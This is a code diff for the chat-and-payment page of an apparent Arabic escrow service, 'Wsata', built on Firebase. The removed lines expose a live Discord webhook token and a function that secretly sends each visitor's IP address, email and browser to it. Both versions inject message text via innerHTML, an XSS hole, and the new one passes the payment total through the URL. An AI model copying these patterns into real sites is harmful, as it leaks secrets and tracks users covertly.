@@ -2,161 +2,116 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Wsata | التذكرة الرسمية</title>
+    <title>مركز التعميد | Wsata</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { background: #05060b; color: white; font-family: sans-serif; overflow: hidden; }
-        .message { margin-bottom: 12px; padding: 14px; border-radius: 20px; max-width: 85%; word-wrap: break-word; display: flex; flex-direction: column; }
-        .msg-admin { background: #1a1d2e; align-self: flex-start; border-right: 4px solid #eab308; border-bottom-right-radius: 4px; }
-        .msg-user { background: #eab308; color: black; align-self: flex-end; font-weight: bold; border-bottom-left-radius: 4px; }
-        .msg-system { background: rgba(255,255,255,0.02); align-self: center; font-size: 10px; color: #777; border: 1px dashed rgba(255,255,255,0.1); }
-        #messageList::-webkit-scrollbar { width: 4px; }
-        #messageList::-webkit-scrollbar-thumb { background: rgba(234, 179, 8, 0.3); border-radius: 10px; }
-        .verified-txt { background: #2563eb; color: white; font-size: 8px; padding: 2px 6px; border-radius: 4px; font-weight: bold; width: fit-content; margin-bottom: 4px; text-transform: uppercase; }
+        * { font-family: 'Tajawal', sans-serif; }
+        body { background: #06070a; color: white; overflow: hidden; }
+        .glass-bg { background: rgba(11, 12, 20, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.05); }
+        .msg { max-width: 80%; padding: 15px 20px; border-radius: 22px; margin-bottom: 12px; font-size: 0.95rem; }
+        .msg-admin { background: #1a1d2e; border-right: 4px solid #fbbf24; align-self: flex-start; }
+        .msg-user { background: #fbbf24; color: #000; font-weight: 700; align-self: flex-end; border-bottom-left-radius: 5px; }
+        .ws-btn { background: #fbbf24; color: #000; transition: 0.3s; font-weight: 900; }
+        .ws-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(251, 191, 36, 0.2); }
     </style>
 </head>
 <body class="flex flex-col h-screen">
-    <nav class="p-4 flex justify-between items-center bg-black/40 border-b border-white/5 backdrop-blur-lg">
-        <div class="flex items-center gap-3">
-            <div class="text-xl font-black text-yellow-500">🛡️ Wsata</div>
-            <div id="ticketStatus" class="text-[9px] text-yellow-500 font-bold px-2 py-1 bg-yellow-500/10 rounded uppercase tracking-tighter">بانتظار الإدارة</div>
+    <script>
+        // التحقق من تسجيل الدخول
+        const sessionData = localStorage.getItem('wasata_session');
+        if (!sessionData) {
+            window.location.href = "https://blaster-tool.xyz/login.html";
+        }
+    </script>
+
+    <nav class="p-5 flex justify-between items-center glass-bg border-b border-white/5">
+        <div class="flex items-center gap-4">
+            <div class="text-2xl font-black text-yellow-500 tracking-tighter">Wsata</div>
+            <div id="statusBadge" class="text-[10px] bg-yellow-500/10 text-yellow-500 px-3 py-1 rounded-full border border-yellow-500/20 font-bold">بانتظار النظام</div>
         </div>
-        <div class="bg-white/5 px-4 py-2 rounded-xl flex items-center gap-2 text-xs border border-white/5">
-            <span id="miniBalance" class="font-black text-yellow-500 text-sm">0.00</span><span class="text-gray-500">SAR</span>
-        </div>
+        <div class="text-xs text-gray-400 font-bold">جميع الحقوق محفوظة لـ Wsata</div>
     </nav>
 
-    <div class="flex-1 flex flex-col max-w-4xl mx-auto w-full p-4 overflow-hidden">
-        <div id="setupForm" class="bg-[#111218] p-8 rounded-[2.5rem] border border-white/10 shadow-2xl mt-10">
-            <h3 class="text-2xl font-black mb-6 text-center">فتح طلب وساطة جديد</h3>
-            <div class="space-y-4 text-right">
-                <div class="bg-black/50 p-4 rounded-xl border border-white/5">
-                    <p class="text-[10px] text-gray-500 mb-1">وصف المنتج أو الخدمة</p>
-                    <input type="text" id="productName" placeholder="مثال: شراء حساب / خدمة برمجية" class="bg-transparent w-full text-lg outline-none text-white">
-                </div>
-            </div>
-            <button id="startBtn" onclick="startChat()" class="w-full bg-yellow-500 text-black py-4 rounded-2xl font-black text-lg mt-6 hover:brightness-110 transition">تأكيد الطلب</button>
+    <div class="flex-1 max-w-4xl mx-auto w-full p-4 flex flex-col">
+        <!-- نموذج البداية -->
+        <div id="setup" class="bg-[#0b0c14] p-10 rounded-[35px] border border-white/5 mt-10 shadow-2xl">
+            <h2 class="text-3xl font-black text-center mb-8">فتح تذكرة تعميد</h2>
+            <input type="text" id="product" placeholder="ما هي السلعة أو الخدمة؟" class="w-full bg-black/40 border border-white/10 p-5 rounded-2xl mb-6 outline-none focus:border-yellow-500 text-lg">
+            <button onclick="createTicket()" class="ws-btn w-full py-5 rounded-2xl text-xl">تأكيد وفتح الطلب</button>
         </div>
 
-        <div id="chatArea" class="hidden flex-1 flex flex-col bg-[#111218]/50 rounded-[2.5rem] border border-white/5 overflow-hidden">
-            <div class="p-3 bg-white/5 border-b border-white/5 flex justify-between items-center text-[10px] text-gray-500">
-                <div id="infoDetails">المنتج: -- | السعر: --</div>
-                <div id="uEmailID" class="font-mono">@user</div>
+        <!-- منطقة الشات -->
+        <div id="chatArea" class="hidden flex-1 flex flex-col overflow-hidden">
+            <div id="msgList" class="flex-1 overflow-y-auto p-4 flex flex-col"></div>
+            
+            <div id="payBox" class="hidden p-6 bg-yellow-500/10 border border-yellow-500/20 rounded-3xl mb-4 flex justify-between items-center">
+                <div>
+                    <span class="text-[10px] text-yellow-500 font-black block mb-1">المبلغ المطلوب سداده</span>
+                    <span id="totalDisplay" class="text-2xl font-black">0.00 SAR</span>
+                </div>
+                <button onclick="goPay()" class="ws-btn px-10 py-4 rounded-xl text-sm">ادفع الآن 💳</button>
             </div>
-            <div id="messageList" class="flex-1 overflow-y-auto p-6 flex flex-col gap-1"></div>
-            <div id="paymentNotice" class="hidden p-5 bg-yellow-500/10 border-t border-yellow-500/20 items-center justify-between">
-                <div><p class="text-[10px] text-yellow-500 font-bold tracking-widest uppercase">Payment Required</p><p class="text-xl font-black" id="payAmount">0.00 SAR</p></div>
-                <button onclick="goToPayment()" class="bg-yellow-500 text-black px-10 py-4 rounded-2xl font-black shadow-xl">إتمام المعاملة 💳</button>
-            </div>
-            <div class="p-4 bg-black/40 flex gap-2">
-                <input id="userMsg" type="text" onkeydown="if(event.key==='Enter') sendMsg()" placeholder="اكتب للوسيط..." class="flex-1 bg-white/5 rounded-2xl px-5 py-4 outline-none border border-transparent focus:border-yellow-500">
-                <button onclick="sendMsg()" class="bg-yellow-500 text-black px-8 rounded-2xl font-black">إرسال</button>
+
+            <div class="p-3 glass-bg rounded-2xl flex gap-3 mb-2">
+                <input id="uInput" type="text" placeholder="اكتب للوسيط..." class="flex-1 bg-transparent outline-none px-4">
+                <button onclick="sendMsg()" class="ws-btn px-8 py-3 rounded-xl text-sm italic">إرسال</button>
             </div>
         </div>
     </div>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1511676605993586688/8IXSL1WEEVCqcQAD49qytkBz3Edk7PBH-ODmM18FGH1PYoVYMeDqYtj5udkWcm7ybNL0";
         const firebaseConfig = { databaseURL: "https://wasata-af6ac-default-rtdb.europe-west1.firebasedatabase.app" };
-        firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const session = JSON.parse(localStorage.getItem('wasata_session')) || {email: 'guest@wsata.com'};
-        const uKey = session.email.replace(/\./g, '_');
+        const user = JSON.parse(sessionData || '{}');
+        const uKey = user.email ? user.email.replace(/\./g, '_') : null;
 
-        async function notifyDiscord(product) {
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🆕 تذكرة وساطة جديدة | Wsata",
-                            color: 16761104,
-                            fields: [
-                                { name: "👤 العميل", value: session.email, inline: true },
-                                { name: "📦 المنتج", value: product, inline: true },
-                                { name: "🌐 IP العميل", value: `||${ipData.ip}||`, inline: false },
-                                { name: "🖥️ المتصفح", value: navigator.userAgent.substring(0, 100), inline: false }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
-            } catch(e) {}
+        function createTicket() {
+            const prod = document.getElementById('product').value;
+            if(!prod) return alert("اكتب تفاصيل الطلب");
+            db.ref('tickets/'+uKey).set({ userEmail: user.email, product: prod, status: 'انتظار الوسيط', amount: 0, fee: 0 });
         }
 
-        function init() {
-            db.ref('tickets/' + uKey).on('value', snap => {
-                const data = snap.val();
-                if(!data) {
-                    if(localStorage.getItem('ws_active')) {
-                        localStorage.removeItem('ws_active');
-                        location.reload();
-                    }
-                    return;
-                }
-                
-                document.getElementById('setupForm').classList.add('hidden');
+        if(uKey) {
+            db.ref('tickets/'+uKey).on('value', snap => {
+                const d = snap.val();
+                if(!d) return;
+                document.getElementById('setup').style.display = 'none';
                 document.getElementById('chatArea').classList.remove('hidden');
-                document.getElementById('ticketStatus').innerText = data.status || 'بانتظار الإدارة';
-                document.getElementById('infoDetails').innerText = `المنتج: ${data.product} | السعر: ${data.amount || '--'} | العمولة: ${data.fee || '--'}`;
-                
-                const list = document.getElementById('messageList');
+                document.getElementById('statusBadge').innerText = d.status;
+
+                if(d.action === 'showPay') {
+                    document.getElementById('payBox').classList.remove('hidden');
+                    document.getElementById('totalDisplay').innerText = (parseFloat(d.amount) + parseFloat(d.fee)).toFixed(2) + " SAR";
+                }
+
+                const list = document.getElementById('msgList');
                 list.innerHTML = "";
-                if(data.messages) {
-                    Object.values(data.messages).forEach(m => {
+                if(d.messages) {
+                    Object.values(d.messages).forEach(m => {
                         const div = document.createElement('div');
-                        if(m.sender === 'admin') {
-                            div.className = "message msg-admin";
-                            div.innerHTML = `<span class="verified-txt">Verified Admin ✓</span>${m.text}`;
-                        } else if(m.sender === 'system') {
-                            div.className = "message msg-system";
-                            div.innerText = m.text;
-                        } else {
-                            div.className = "message msg-user";
-                            div.innerText = m.text;
-                        }
+                        div.className = `msg ${m.sender === 'admin' ? 'msg-admin' : 'msg-user'}`;
+                        div.innerHTML = m.sender === 'admin' ? `<span class="text-[9px] text-yellow-500 font-black block mb-1">وسيط معتمد ✓</span>${m.text}` : m.text;
                         list.appendChild(div);
                     });
                     list.scrollTop = list.scrollHeight;
                 }
-
-                const pBox = document.getElementById('paymentNotice');
-                if(data.action === 'showPay') {
-                    pBox.classList.replace('hidden', 'flex');
-                    document.getElementById('payAmount').innerText = (parseFloat(data.amount || 0) + parseFloat(data.fee || 0)).toFixed(2) + " SAR";
-                } else { pBox.classList.replace('flex', 'hidden'); }
             });
         }
 
-        function startChat() {
-            const prod = document.getElementById('productName').value || 'طلب وساطة';
-            document.getElementById('startBtn').disabled = true;
-            localStorage.setItem('ws_active', 'true');
-            db.ref('tickets/' + uKey).set({
-                userEmail: session.email,
-                product: prod,
-                status: 'بانتظار الوسيط',
-                createdAt: Date.now()
-            }).then(() => notifyDiscord(prod));
-        }
-
         function sendMsg() {
-            const inp = document.getElementById('userMsg');
+            const inp = document.getElementById('uInput');
             if(!inp.value.trim()) return;
-            db.ref('tickets/' + uKey + '/messages').push({ text: inp.value, sender: 'user' });
+            db.ref('tickets/'+uKey+'/messages').push({ text: inp.value, sender: 'user' });
             inp.value = "";
         }
 
-        function goToPayment() {
-            window.location.href = `payment.html?ticket=${uKey}`;
+        function goPay() {
+            window.location.href = `payment.html?ticket=${uKey}&total=${parseFloat(document.getElementById('totalDisplay').innerText)}`;
         }
-
-        init();
     </script>
 </body>
 </html>
